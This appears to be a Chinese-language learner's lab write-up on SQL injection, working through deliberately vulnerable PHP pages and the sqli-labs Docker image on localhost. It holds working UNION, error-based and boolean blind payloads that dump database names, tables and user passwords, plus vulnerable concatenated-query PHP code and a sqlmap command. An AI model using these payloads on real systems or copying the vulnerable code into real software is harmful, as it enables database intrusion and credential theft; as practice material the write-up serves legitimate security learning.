# SQL 注入

## 数字型
以 `qsl1.php` 为例：  
```
http://localhost:8080/sql1.php?id=1
```

这里 id 就是传入的字符串。在后台 php 进行字符串拼接:
``` php
$id = $_GET['id'] ?? 1;
$sql = "SELECT title, content FROM wp_news WHERE id=$id";
```
这里查询 wp_news 中 id 对应的数据。  

如果后面加上 OR 1=1 就会导致 WHERE 语句失效，直接打印 wp_news 表中所有数据。  

用 `ORDER BY` 排序语句来查询列数：  
`id = 1 order by 2` 还有结果,`order by 3` 报错，4 也报错。确定是 2 列。  

如果 id=-1 也就是负数落空，会出来查询为空的错误。可以用 union 对表进行纵向拼接后面跟上其他表。同时 union 还规定左右两个 select 列数必须一样多。  
可以这样：
``` mysql
id = -1 UNION SELECT database(), user()
```
查询到为 test root@……  

接下来祭出大杀器来查询所有表：  
``` mysql
id=-1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
```

这里直接查元数据库把当前库所有表名合并成一个字符串。  
`group_concat(table_name)`  将查询出来的多行 `table_name` 用逗号拼接成一个字符串。  
后面跟上数据来源，`information_schema` 里面放着 MYSQL 所有数据库的元数据。`.tables` 存储所有数据库中的表名，关键字有：`table_name` 表名、`table_schema` 所属数据库。  

`WHERE table_schema = database()` 精准筛选当前数据库的表，database() 返回当前数据库名。  
这样就输出： 
```
users,wp_news
```

找到 users 表。  

再改成下面的语句：  
``` mysql
id=-1 UNION SELECT 1,group_concat(table_name, ',', column_name) FROM information_schema.columns WHERE table_schema=database()
```

也就是 group_concat 内部内容改了，然后 information_schema.tables 改成 information_schema.columns 而已。  
输出：  
```
users,id,users,password,users,username,wp_news,content,wp_news,id,wp_news,title
```

可以确定 users 表有 id, users password 列。  

然后直接配合 union 直接选中查表：  
``` mysql
id=-1 UNION SELECT username, password FROM users
```

即可泄漏所有账号和密码。  

## 字符型
当 OR 1=1失效时就说明不是数字型的 SQL 注入。可以考虑字符型 SQL 。  
在 id 加个 '：  
```
?id=1'
```

直接报错：  
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1 in /var/www/html/sql2.php:14 Stack trace: #0 /var/www/html/sql2.php(14): mysqli_query(Object(mysqli), 'SELECT title, c...') #1 {main} thrown in /var/www/html/sql2.php on line 14
```

而  
```
?id=1' or '1'='1
```

注意，最后没有引号包裹。直接输出大量内容。补上引号又报错。显然是字符型。  
``` php
$id = $_GET['id'];
$sql = "SELECT title, content FROM wp_news WHERE id='$id'";
```
查看源码可以看出确实是被单引号包裹。  

``` mysql
id=-1' union select 1, 2--+
```

和数字型一样用 -1 清空表。然后 select 1, 2 后面用 `--+` 把最后的引号注释掉。输出：  
```
1
2
```

之后步骤和数字型一样。  

## search.php
php 代码长这样

``` php
$keyword = $_GET['q'] ?? '';
$sql = "SELECT title, content FROM wp_news WHERE title LIKE '%$keyword%'";
```
输入值被 %% 包裹住，也就是匹配含 keyword 的项。  
可以尝试输入内容，有匹配就会显示，没有就空项然后内容后面加单引号：  
```
?q=zzz'
```
直接报错：  

```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1 in /var/www/html/search.php:23 Stack trace: #0 /var/www/html/search.php(23): mysqli_query(Object(mysqli), 'SELECT title, c...') #1 {main} thrown in /var/www/html/search.php on line 23
```

就确定是这种 %% 包裹的。  

只需要前面填一个字符然后用单引号包裹，最后面加上 # 注释 % 即可解构开始注入：  
``` sql
z'union select 1, 2#
```

后面过程一样的。  


## login.php
这里是用 POST 发登录表单。

``` php
$message = "";
$logged_in = false;
$username = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'];
    $pass = $_POST['password'];

    $sql = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
    $res = mysqli_query($conn, $sql);

    if ($res && mysqli_num_rows($res) > 0) {
        $row = mysqli_fetch_assoc($res);
        $logged_in = true;
        $username = $row['username'];
        $message = "登录成功！欢迎 $username";
    } else {
        $message = "登录失败！执行的SQL: " . $sql;
    }
}
```

---
………………分割线………………  

## sqli-labs

决定用 [https://hub.docker.com/r/acgpiano/sqli-labs/](https://hub.docker.com/r/acgpiano/sqli-labs/) ssqli-labs 的 docker 镜像来系统性的学 sql 注入。  

``` bash
docker run -d --name sqli-labs -p 8080:80 acgpiano/sqli-labs
```

就是这样，然后外部用 8080 端口的 http 访问。  
```
http://localhost:8080/
```

不行的就检查 docker 的端口是否正常打开：  
```
❯ docker port sqli-labs
80/tcp -> 0.0.0.0:8080
80/tcp -> [::]:8080
```

### less-1
 Please input the ID as parameter with numeric value  
要求用 id  GET 请求传参。  

```
?id=1' '1' or '1
```
能行说明是字符型。然后 order by 发现是 3 列。  

```
?id=1' order by 3 -- -
```

到 order by 4 就报错了。  

接下来 `?id=-1' union select 1, 2, 3-- -` 确定是 3 列，输出 2, 3。  
获取用户名、数据库、版本号：  

```
?id=-1' union select 1, 2, (select group_concat(user(), database(), version()))-- -
```
输出：  
```
Your Login name:2
Your Password:root@localhostsecurity5.5.44-0ubuntu0.14.04.1
```

获取所有数据库名：  

```
?id=-1' union select 1, 2, (select group_concat(schema_name) from information_schema.schemata)-- -
```
输出：  
```
Your Login name:2
Your Password:information_schema,challenges,mysql,performance_schema,security
```

获取 security 所有表名：  
```
?id=-1' union select 1, 2, (select group_concat(table_name) from information_schema.tables where table_schema='security')-- -
```

输出：
```
Your Password:emails,referers,uagents,users
```


获取 users 所有列名：  
```
?id=-1' union select 1, 2, (select group_concat(column_name) from information_schema.columns where table_name='users')-- -
```

输出：  
```
Your Login name:2
Your Password:id,username,password
```

获取 users 表中的 username 列和 password 列：  
```
?id=-1' union select 1, (select group_concat(username) from security.users), (select group_concat(password) from security.users)-- -
```

输出：  
```
 Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```

这样就拿到所有用户密码，基础注入点测试。    

#### 更好的联合查询注入

``` sql
-1' union select 1,2,(select group_concat(concat(username,':',password) separator 0x3c62723e) from users)-- -
```

这里还是从 users 表里取出所有的 username 和 password 列。但是显示更清楚：  
```
Welcome    Dhakkan
Your Login name:2
Your Password:Dumb:Dumb
Angelina:I-kill-you
Dummy:p@ssword
secure:crappy
stupid:stupidity
superman:genious
batman:mob!le
admin:admin
admin1:admin1
admin2:admin2
admin3:admin3
dhakkan:dumbo
admin4:admin4
```

`concat()` 用于拼接多个字符串，`group_concat()` 合并多行数据为一个字符串。通过 separator 将每行数据做分隔符。而 `x3c62723e` 是 `<br>` 的 16 进制表示，这样一来就很清晰了。  

这里的 `':'` 也可以换成 0x3e。  

#### 报错注入
1. `updatexml()` 

因为 `concat(0x7e, (select database()), 0x7e)` 不是合法的 XPath,但是 sql 会先对 concat 做解析再输出错误，这样就能看到某些内容了。  
内层的 select database() 可以让我们在错误信息里看到数据库名，用 0x7e 做 ~ 分割。  
``` sql
?id=1' and (updatexml(1,concat(0x7e,(select database()),0x7e),1))-- -
```

输出：  
```
 XPATH syntax error: '~security~'
```

所以当前数据库名是 security，`database()` 也可以换成`user()` 之类。  

2. `extractvalue()`

和 updatexml 差不多。  
``` sql
?id=1' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -
```

输出：  
```
 XPATH syntax error: '~root@localhost~'
```

3. `floor()`

``` sql
?id=1' and (select 1 from (select+count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
```

输出：  
```
Duplicate entry 'root@localhost1' for key 'group_key' 
```


比如用 `updatexml` 查表名，上面已经拿到数据库名为 `security` 了，更深入的：  
```
?id=1' and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0, 1),0x7e),1))-- -
```

取出 (0, 1) 的表名，输出：` XPATH syntax error: '~emails~'` 因为 updatexml 的限制，每次只能取出一个，用 limit 0, 1 之类来取，比如还可以`limit 1,1`、`limit 2,1`。  

……  

#### 布尔盲注
通过页面真假差异逐字符推断数据的注入方式，即使目标既不回显数据也不显示报错只要页面对不同查询结果有细微差异就能利用。  

``` sql
?id=1' and (ascii(substr(database(),1,1))>114)-- -
?id=1' and (ascii(substr(database(),1,1))>115)-- -
```
判断数据库名第一个字符的 ASCII 是 115。  

#### sqlmap
直接用地址：  `sqlmap -u "http://192.168.122.1:8080/Less-1/?id=1"` 这样就可以得到数据库版本信息：  

```
[16:23:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.1
```
